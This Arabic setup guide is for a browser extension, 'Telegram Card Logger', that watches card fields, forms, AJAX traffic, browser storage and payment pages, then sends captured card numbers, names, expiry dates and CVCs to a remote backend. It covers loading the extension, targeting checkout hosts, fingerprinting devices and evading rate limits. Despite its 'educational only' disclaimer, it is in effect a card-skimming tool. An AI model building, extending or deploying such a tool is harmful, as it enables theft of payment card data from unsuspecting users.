# 🔔 Telegram Card Logger - Frontend Guide

دليل مفصل لإعداد واستخدام الإكستنشن (الفرونت إند)

## 📋 ملخص الفرونت إند

الإكستنشن هو الجزء الذي يعمل في المتصفح لمراقبة البيانات وإرسالها إلى الباك إند.

## 🚀 الميزات

### 📊 واجهة تفاعلية
- Popup مع إحصائيات مباشرة
- عرض حالة Rate Limiting
- سجلات مفصلة للأنشطة
- أزرار اختبار ومسح السجلات

### 🔍 مراقبة شاملة
- مراقبة حقول البطاقات
- مراقبة النماذج
- مراقبة طلبات AJAX/XMLHttpRequest
- مراقبة localStorage/sessionStorage

### 🛡️ أمان متقدم
- توليد معرف فريد لكل جهاز
- توقيع الطلبات
- تشفير البيانات
- حماية من التلاعب

## 📁 هيكل الفرونت إند

```
frontend/
├── background.js                  # Background Script - المنطق الرئيسي
├── content.js                     # Content Script - مراقبة الصفحات
├── popup.html                     # واجهة Popup
├── popup.js                       # منطق Popup
├── manifest.json                  # إعدادات الإكستنشن
├── icon16.png                     # أيقونة 16x16
├── icon48.png                     # أيقونة 48x48
└── icon128.png                    # أيقونة 128x128
```

## ⚙️ التثبيت والإعداد

### 1. تحديث رابط API

في ملف `frontend/background.js`، حدث السطر الأول:

```javascript
const NETLIFY_API_URL = 'https://your-site.netlify.app/.netlify/functions/telegram-api';
```

استبدل `your-site` باسم موقعك على Netlify.

### 2. تحميل الإكستنشن

#### الطريقة الأولى: من مجلد محلي
1. افتح Chrome
2. اذهب إلى `chrome://extensions/`
3. فعّل "Developer mode" (الوضع المطور)
4. اضغط "Load unpacked" (تحميل غير معبأ)
5. اختر مجلد `frontend`

#### الطريقة الثانية: من ملف ZIP
1. اضغط بزر الماوس الأيمن على مجلد `frontend`
2. اختر "Send to > Compressed (zipped) folder"
3. اذهب إلى `chrome://extensions/`
4. اسحب ملف ZIP إلى الصفحة

### 3. إضافة الأيقونات

استبدل ملفات الأيقونات بأيقونات حقيقية:
- `icon16.png` - 16×16 بكسل
- `icon48.png` - 48×48 بكسل  
- `icon128.png` - 128×128 بكسل

يمكنك الحصول على أيقونات من:
- [Flaticon](https://www.flaticon.com/)
- [Icons8](https://icons8.com/)
- [Feather Icons](https://feathericons.com/)

## 🔧 كيفية الاستخدام

### 1. تشغيل الإكستنشن
- اضغط على أيقونة الإكستنشن في شريط الأدوات
- ستظهر واجهة Popup مع الإحصائيات

### 2. اختبار الاتصال
- اضغط "اختبار الاتصال" في Popup
- ستظهر رسالة نجاح أو فشل

### 3. مراقبة البيانات
الإكستنشن يراقب تلقائياً:
- حقول البطاقات في النماذج
- طلبات AJAX/XMLHttpRequest
- بيانات localStorage/sessionStorage
- صفحات الدفع

### 4. عرض الإحصائيات
في Popup ستجد:
- إجمالي الطلبات المرسلة
- الطلبات الناجحة/المحظورة
- الطلبات المتبقية
- الوقت المتبقي لإعادة التعيين

## 📊 أنواع البيانات المراقبة

### 1. بيانات البطاقة
```javascript
{
  number: "1234-5678-9012-3456",
  name: "John Doe",
  expiry: "12/25",
  cvc: "123"
}
```

### 2. بيانات BIN
```javascript
{
  pattern: "123456",
  cardNumber: "1234567890123456",
  name: "Visa",
  expiryDate: "12/25",
  cvc: "123"
}
```

### 3. رسائل عادية
```javascript
{
  message: "تم زيارة صفحة دفع"
}
```

## 🛡️ الأمان

### توليد معرف الجهاز
```javascript
function generateDeviceFingerprint() {
  const canvas = document.createElement('canvas');
  const ctx = canvas.getContext('2d');
  ctx.textBaseline = 'top';
  ctx.font = '14px Arial';
  ctx.fillText('Device fingerprint', 2, 2);
  
  const fingerprint = canvas.toDataURL();
  return btoa(fingerprint).substring(0, 32);
}
```

### توقيع الطلبات
```javascript
function calculateSignature(timestamp, data, deviceFingerprint) {
  const message = timestamp + JSON.stringify(data) + deviceFingerprint;
  return btoa(message).substring(0, 32);
}
```

## 🔍 استكشاف الأخطاء

### مشاكل شائعة:

#### 1. الإكستنشن لا يعمل
- تحقق من تفعيل Developer mode
- أعد تحميل الإكستنشن
- تحقق من سجلات Console

#### 2. لا يتم إرسال البيانات
- تحقق من رابط API في `background.js`
- تأكد من عمل الباك إند
- راجع سجلات Console

#### 3. مشاكل Rate Limiting
- انتظر 5 دقائق بعد تجاوز الحد
- تحقق من عدد الطلبات في Popup
- استخدم جهاز آخر مؤقتاً

### سجلات التطوير
افتح Developer Tools (F12) واذهب إلى Console لرؤية:
- رسائل الإكستنشن
- أخطاء الاتصال
- معلومات Rate Limiting

## 📈 التخصيص

### تغيير الأذونات
في `manifest.json`:
```json
{
  "permissions": [
    "webRequest",
    "webRequestBlocking",
    "storage",
    "notifications",
    "scripting",
    "activeTab",
    "tabs"
  ]
}
```

### إضافة مواقع جديدة
في `content.js`، أضف مواقع جديدة للمراقبة:
```javascript
if (url.hostname.includes('payment') || url.hostname.includes('checkout')) {
  // مراقبة الموقع
}
```

### تغيير تصميم Popup
عدّل ملف `popup.html` و `popup.css` لتغيير:
- الألوان
- الأحجام
- التخطيط
- الرسوم المتحركة

## 🔄 التطوير

### التطوير المحلي
1. عدّل الملفات في مجلد `frontend`
2. اذهب إلى `chrome://extensions/`
3. اضغط "Reload" على الإكستنشن
4. اختبر التغييرات

### إضافة ميزات جديدة
1. أضف المنطق في `background.js`
2. أضف الواجهة في `popup.html`
3. أضف التفاعل في `popup.js`
4. اختبر الميزة الجديدة

## 📞 الدعم

للمساعدة أو الإبلاغ عن مشاكل:
1. راجع هذا الملف أولاً
2. تحقق من سجلات Console
3. تأكد من إعدادات الإكستنشن
4. تحقق من عمل الباك إند

## 📄 الترخيص

هذا الفرونت إند مخصص للاستخدام التعليمي والبحثي فقط.

---

**⚠️ تحذير**: هذا الإكستنشن مخصص للاستخدام القانوني فقط. يرجى احترام خصوصية الآخرين وقوانين حماية البيانات. 